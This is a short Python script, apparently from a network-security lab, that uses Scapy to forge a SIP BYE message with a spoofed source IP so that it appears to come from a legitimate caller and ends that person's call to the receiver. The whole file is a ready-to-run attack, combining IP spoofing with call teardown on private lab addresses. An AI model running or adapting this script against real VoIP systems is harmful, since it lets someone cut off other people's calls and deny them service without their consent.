from scapy.all import *

# Attacker's Interface
interface = "eth0"

# SIP Call Details
client1_ip = "10.9.0.3"  # SIP Receiver
client2_ip = "10.9.0.2"  # Legitimate Caller (we are spoofing this)
spoofed_ip = client2_ip  # The fake source IP
sip_call_id = "222222@example.com"  # Fix missing closing quote
sip_cseq = "2"  # Should be incremented for correctness

# Function to send a SIP message with a spoofed IP
def send_sip_message(dst_ip, spoofed_ip, sip_message):
    sip_packet = IP(src=spoofed_ip, dst=dst_ip) / UDP(sport=5060, dport=5060) / Raw(load=sip_message)
    send(sip_packet, iface=interface, verbose=True)

# SIP BYE Message (spoofing Client2 to terminate the call)
sip_bye = (
    f"BYE sip:{client1_ip} SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP {spoofed_ip}:5060;branch=z9hG4bK-333333\r\n"
    f"To: <sip:{client1_ip}>;tag=7777\r\n"
    f"From: <sip:{spoofed_ip}>;tag=5678\r\n"
    f"Call-ID: {sip_call_id}\r\n"
    f"CSeq: {sip_cseq} BYE\r\n"
    f"User-Agent: Scapy-SIP\r\n"
    f"Content-Length: 0\r\n\r\n"
)

print("[*] Sending spoofed BYE to end the call")
send_sip_message(client1_ip, spoofed_ip, sip_bye)  # Send BYE message
